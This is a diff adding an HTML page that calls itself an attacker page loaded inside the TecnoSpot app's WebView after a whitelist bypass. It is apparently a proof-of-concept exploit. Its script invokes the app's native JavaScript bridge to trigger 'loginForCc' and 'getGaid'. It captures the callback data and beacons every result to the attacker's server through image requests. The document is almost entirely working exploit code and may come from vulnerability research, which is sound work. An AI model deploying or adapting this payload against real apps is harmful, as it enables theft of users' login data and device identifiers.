@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>stage</title>
+</head>
+
+<body style="font-family:monospace;font-size:24px">
+    <p>attacker page inside TecnoSpot WebViewPageWithCallback (whitelist bypassed)</p>
+    <pre id="o" style="white-space:pre-wrap;word-break:break-all"></pre>
+    <script>
+        function out(k, v) {
+            document.getElementById('o').textContent += k + ': ' + String(v).slice(0, 400) + String.fromCharCode(10); new Image().src = '/b?t=' + k + '&v=' + encodeURIComponent(String(v).slice(0, 6000));
+        }
+
+        window.appJsBridge = {
+            onCallback: function (id, data) {
+                out('callback' + id, data);
+            }
+        };
+
+        out('origin', location.origin); 
+        out('bridge', typeof window.androidJsBridge);
+
+        function call(id, m, p) {
+            try {androidJsBridge.callAndroid(id, m, p); 
+                out('call' + id, m + ' ' + p);
+            } catch (e) {
+                out('err' + id, e);
+            } 
+        }
+
+        call(1, 'loginForCc', '{"fastLogin":true}');
+
+        setTimeout(function () {
+            call(2, 'getGaid', '{}');
+        }, 1500);
+    </script>
+</body>
+
+</html>
